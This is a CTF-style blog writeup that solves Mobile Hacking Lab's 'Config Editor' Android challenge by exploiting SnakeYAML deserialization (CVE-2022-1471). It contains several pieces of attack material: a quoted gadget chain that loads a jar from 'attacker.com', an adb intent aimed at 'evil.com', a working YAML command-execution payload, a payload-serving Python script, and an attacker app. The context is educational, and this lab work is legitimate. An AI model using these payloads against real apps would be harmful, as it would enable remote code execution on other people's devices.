---
title:  "Mobile Hacking Lab Config Editor Writeup"
date:   2024-01-22T16:27:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [Config Editor](https://www.mobilehackinglab.com/course/lab-config-editor-rce) challenge from Mobile Hacking Lab. 

## Static Analysis

When we open the app in emulator, it opens a page with "load" and "save" buttons and a text input area. When we press the load button, it opens the file manager for us to select a file and we can load example.yml file that created by app. Also we can write something to text area and save it with save button. Before saving file, it recommends a file name with yml extension again. Let's open it with jadx to understand the app.

![](/assets/images_mhl_configeditor/manifest.png)

When we examine the manifest file, we see that an intent filter is defined for MainActivity. To properly trigger this activity we need to send intent with http/https or file scheme and VIEW action. Also, the type of data we will send with intent is expected to be yaml.
```bash
# Sample intent
adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://evil.com"
```
But we need to know what happened when this activity triggered. To undestand this, lets analyze MainActivity

![](/assets/images_mhl_configeditor/mainactivity.png)
 
Inside the onCreate function, handleIntent method called after setting the view of activity.

### handleIntent Function

![](/assets/images_mhl_configeditor/handleIntent.png)

handleIntent function handle the coming intent and after checking the action and uri, sends the uri to CopyFileFromUri function. After copying file from uri, it loads the yaml file with loadYaml function. During download and save processes getLastPathSegment function leads to file write with directory traversal vulnerability but this is not the case we will look into in this post. I explained that vulnerability on my [previous post](https://sh4d0wlesss.github.io/writeup/Mobile-Hacking-Lab-Document-Viewer-Challenge-Writeup/). This challenge have same vulnerability too. If you dont trust me go and test it :D

### loadYaml Function

![](/assets/images_mhl_configeditor/loadYaml.png)

loadYaml function gets the file from given uri and loads it with yaml.load function. This load function comes from snakeyaml(org.yaml.snakeyaml) package. This is a popular java library to parse yaml files. Some tips were given on the challenge page, and these tips mentioned finding a vulnerability in a 3rd party library. Since there is no native library file in the apk, the vulnerable library may be the snakeyaml library. Also, about a week before I wrote this article, I watched a [video prepared by mdisec](https://www.youtube.com/watch?v=IPrRccHlgLM) on YouTube, and while trying to solve this challenge, I remembered that the snakeyaml library was also mentioned in that video. In the video, a deserialization vulnerability(`CVE-2022-1471`) in the snakeyaml library is mentioned and the exploitation stages are shown in practice.

#### CVE-2022-1471

As far as I understand from the blog posts I read while researching this vulnerability, during the serialization we can specify the object inside the yaml file and snakeyaml will use this class name for creating object from same class during deserialization(also snakeyaml add that classnames when yaml.dump fucntion called for serialization). For example, we can specify the object type as car inside the yaml:
```yaml
car: 
  !!sample.car
  brand: kia
  model: rio
  year: 2004
  type: stationwagon
```
We can write the any class(must be in classpath) we want in the yaml file and the vulnerability is revealed here. Here is the example gadget chain shared as poc for this vuln:
```yaml
#ref: https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471

person: !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL [http://attacker.com/malicious-code.jar]
    ]]
]
```
With this chain (If the attacker can control the content of the yaml file) attacker can get remote code execution. I will not explain the details of the attack in this article. If you want to examine the detailed stages of this attack, [I highly recommend this blog post.](https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471) I tried this payload with app but it gives error because ScriptEngineManager class not found. [After some research](https://stackoverflow.com/questions/46320972/engine-eval-returns-null-in-android-studio) i saw that ScriptEngineManager is not available on Android by default. Instead of that everyone recommend `rhino` but im not a Android developer and i didnt understand anything that i read about that topic :D

But we need to get a remote code execution somehow. As you can see in the first picture I added at the beginning of the article, there is another class called LegacyCommandUtil in the application.

```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```
Inside the constructor of this class, a "command" executed with runtime exec function. We can use this class to exploit this vulnerability because we can access this class. Here is the sample yaml file:
```yaml
cartcurt: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/com.mobilehackinglab.configeditor/poc.txt"]
```
If this payload works, poc.txt file will be created inside the application directory. For serving this file i used my hacky server code from previous post :
```py
#proudly stolen from : https://stackoverflow.com/questions/46105356/serve-a-file-from-pythons-http-server-correct-response-with-a-file
from http.server import BaseHTTPRequestHandler, HTTPServer
class MyHackyServer(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        exploit_file = open('hacky.yml', 'rb')
        self.wfile.write(exploit_file.read())
        self.end_headers()


myServer = HTTPServer(('localhost', 1234), MyHackyServer)
myServer.serve_forever()
```
and the adb command for sending proper intent:
```bash
adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.action.intent.VIEW -d "http://10.0.3.2:1234"
# 10.0.3.2 is the address of localhost of host machine for genymotion, if you are using Android Studio emulators, this ip will be 10.0.2.2 for you.
```
Here is the result(video):

[![](https://img.youtube.com/vi/vhk_WS9Da_0/0.jpg)](https://youtu.be/vhk_WS9Da_0)

It works! If you want to make same thing with evil application, here is my sample code:
```java
package com.example.exploitconfigeditor;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Uri uri = Uri.parse("http://10.0.3.2:1234");
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setClassName("com.mobilehackinglab.configeditor","com.mobilehackinglab.configeditor.MainActivity");
        intent.setData(uri);
        startActivity(intent);
    }
}
```
And poc video:

[![](https://img.youtube.com/vi/YGbHG2m4clM/0.jpg)](https://youtu.be/YGbHG2m4clM)

We can run code remotely with small yaml file :)

Sad note:
- I have tried lots of payloads to get reverse shell but i failed. [As mentioned here](https://stackoverflow.com/questions/25199307/unable-using-runtime-exec-to-execute-shell-command-echo-in-android-java-code), exec function does not execute [shell builtins](https://www.networkworld.com/article/967046/how-to-identify-shell-builtins-aliases-and-executable-files-on-linux-systems.html), it executes executables and for getting reverse shell i need to pass string array to constructor. Also i tried payloads with ${IFS} but they didn't work. If you can create working reverse shell payload please dm me on twitter or linkedin
- In this example we have a class that executes commands but in real world scenario i dont know how i can get remote code execution on android app with this vulnerability. If you can get rce on this challenge with another method, please dm me 👀

Thanks for reading! See you in next writeups :)
